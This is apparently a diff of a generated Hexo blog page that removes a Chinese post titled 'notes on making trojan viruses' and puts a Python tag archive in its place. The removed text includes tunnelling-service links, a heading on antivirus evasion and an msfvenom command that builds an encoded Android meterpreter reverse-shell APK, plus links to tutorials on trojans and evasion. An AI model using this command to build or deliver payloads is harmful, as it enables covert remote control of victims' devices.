@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title> Hexo</title>
+      <title>Tag: Python |  Hexo</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -55,172 +55,56 @@
       
     <main class="content on">
       <section class="outer">
-  <article
-  id="post-信息安全/木马病毒制作的笔记"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-     
-    <div class="article-meta">
-      <a href="/2023/11/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%B6%E4%BD%9C%E7%9A%84%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time datetime="2023-11-06T13:13:29.506Z" itemprop="datePublished">2023-11-06</time>
-</a>   
-<div class="word_count">
-    <span class="post-time">
-        <span class="post-meta-item-icon">
-            <i class="ri-quill-pen-line"></i>
-            <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">165</span>
-        </span>
-    </span>
-
-    <span class="post-time">
-        &nbsp; | &nbsp;
-        <span class="post-meta-item-icon">
-            <i class="ri-book-open-line"></i>
-            <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
-        </span>
-    </span>
-</div>
- 
-    </div>
-      
-    <div class="tocbot"></div>
-
-
-
-
   
-    <div class="article-entry" itemprop="articleBody">
+  
+  <article class="articles">
+    
+    
+    <h1 class="page-type-title">#&nbspPython</h1>
+    
+    
+  
+  
+  
+  
+  
+  
+  <div class="archives-wrap">
+    <div class="archive-year-wrap">
+      <a href="/archives/2023" class="archive-year">2023</a>
+    </div>
+    <div class="archives">
+      
+      <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      <a href="/2023/11/07/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/Python%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="archive-article-date">
+  <time datetime="2023-11-07T13:51:00.000Z" itemprop="datePublished">11/07</time>
+</a>
        
-  <hr>
-<hr>
-<h1 id="木马病毒制作的笔记"><a href="#木马病毒制作的笔记" class="headerlink" title="木马病毒制作的笔记"></a>木马病毒制作的笔记</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><a target="_blank" rel="noopener" href="https://hsk.oray.com/">花生壳</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.ngrok.cc/user.html">ngork</a></p>
-<h2 id="木马病毒的制作"><a href="#木马病毒的制作" class="headerlink" title="木马病毒的制作"></a>木马病毒的制作</h2><h3 id="windows病毒"><a href="#windows病毒" class="headerlink" title="windows病毒"></a>windows病毒</h3><h3 id="安卓病毒"><a href="#安卓病毒" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="病毒免杀"><a href="#病毒免杀" class="headerlink" title="病毒免杀"></a>病毒免杀</h2><h3 id="安卓病毒-1"><a href="#安卓病毒-1" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform Android -p android/meterpreter/reverse_tcp LHOST=服务器地址（域名） LPORT=隧道端口 -e x86/shikata_ga_nai R &gt; black_1.apk</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="目标机器中毒后的操作"><a href="#目标机器中毒后的操作" class="headerlink" title="目标机器中毒后的操作"></a>目标机器中毒后的操作</h2><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a target="_blank" rel="noopener" href="https://blog.csdn.net/NuclearDalance/article/details/116450238">https://blog.csdn.net/NuclearDalance/article/details/116450238</a>	“使用Kali Linux系统生成木马病毒并实现远程控制计算机”<br>[2]: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12893">https://xz.aliyun.com/t/12893</a>	“Android免杀小结”<br>[3]: <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2245833">https://cloud.tencent.com/developer/article/2245833</a>	“使用Kali生成木马入侵安卓手机”</p>
-<p>[4]: <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-254995.htm">https://bbs.kanxue.com/thread-254995.htm</a>	“[分享]免杀之安卓渗透”</p>
+<h2 itemprop="name">
+  <a class="archive-article-title" href="/2023/11/07/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/Python%E5%B0%8F%E6%8A%80%E5%B7%A7/"
+    >Python小技巧</a> 
+</h2>
  
-      <!-- reward -->
+
+    </header>
+    
+    
       
-      <div id="reword-out">
-        <div id="reward-btn">
-          Donate
-        </div>
-      </div>
-      
-    </div>
-    
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li></ul>
 
-    <!-- copyright -->
     
-    <div class="declare">
-      <ul class="post-copyright">
-        <li>
-          <i class="ri-copyright-line"></i>
-          <strong>Copyright： </strong>
-          
-          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
-          
-        </li>
-      </ul>
-    </div>
-    
-    <footer class="article-footer">
-       
-<div class="share-btn">
-      <span class="share-sns share-outer">
-        <i class="ri-share-forward-line"></i>
-        分享
-      </span>
-      <div class="share-wrap">
-        <i class="arrow"></i>
-        <div class="share-icons">
-          
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="ri-weibo-fill"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="ri-wechat-fill"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="ri-qq-fill"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="ri-douban-line"></i>
-          </a>
-          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a> -->
-          
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="ri-facebook-circle-fill"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="ri-twitter-fill"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="ri-google-fill"></i>
-          </a>
-        </div>
-      </div>
-</div>
-
-<div class="wx-share-modal">
-    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/11/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%B6%E4%BD%9C%E7%9A%84%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div id="share-mask"></div>  
-    </footer>
   </div>
-
-   
-  <nav class="article-nav">
-    
-      <a href="/2023/11/06/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E9%80%9A%E8%BF%87kali%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            (no title)
-          
-        </div>
-      </a>
-    
-    
-      <a href="/2023/11/04/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/Python%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="article-nav-link">
-        <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title"></div>
-      </a>
-    
-  </nav>
-
-  
-   
-  
-   
-    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
-    <div id="twikoo" class="twikoo"></div>
-    <script>
-        twikoo.init({
-            envId: ""
-        })
-    </script>
- 
 </article>
+      
+      
+    </div>
+  </div>
+  
+  
 
+  
 </section>
       <footer class="footer">
   <div class="outer">
@@ -361,22 +245,6 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
- 
-<script src="/js/tocbot.min.js"></script>
-
-<script>
-  tocbot.init({
-    tocSelector: ".tocbot",
-    contentSelector: ".article-entry",
-    headingSelector: "h1, h2, h3, h4, h5, h6",
-    hasInnerContainers: true,
-    scrollSmooth: true,
-    scrollContainer: "main",
-    positionFixedSelector: ".tocbot",
-    positionFixedClass: "is-position-fixed",
-    fixedSidebarOffset: "auto",
-  });
-</script>
 
 <script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
 <link
